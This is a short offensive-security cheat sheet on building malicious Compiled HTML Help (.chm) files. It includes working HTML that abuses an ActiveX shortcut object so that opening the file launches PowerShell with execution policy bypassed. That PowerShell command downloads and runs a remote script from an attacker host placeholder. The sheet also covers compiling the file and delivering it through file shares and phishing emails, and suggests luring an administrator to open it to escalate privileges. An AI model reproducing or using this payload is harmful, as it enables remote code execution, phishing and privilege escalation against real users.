# CHM Malicious Help File

Compiled HTML Help (.chm) files can execute arbitrary commands when opened. Deliver via file share or drop to get code execution as the opener.

## Create Malicious CHM
Using `nishang` Out-CHM or manual HTML:

```html
<!-- Malicious HTML for .chm -->
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap::shortcut">
<PARAM name="Item1" value=',powershell.exe,-nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\"http://<LHOST>/shell.ps1\")"'>
<PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
```

Compile with `hhc.exe` (HTML Help Workshop):
```
hhc.exe project.hhp
```

## Deliver
- Drop `.chm` file to a share the target user accesses
- Send via email attachment (phishing)
- Place in directory the target browses

## Notes
- Executes when file is opened with `hh.exe` (Windows default handler)
- Script runs in context of the user opening the file
- Useful for privesc when admin opens a file you can write to a share they access
- `OutCHM.ps1` from Nishang automates creation
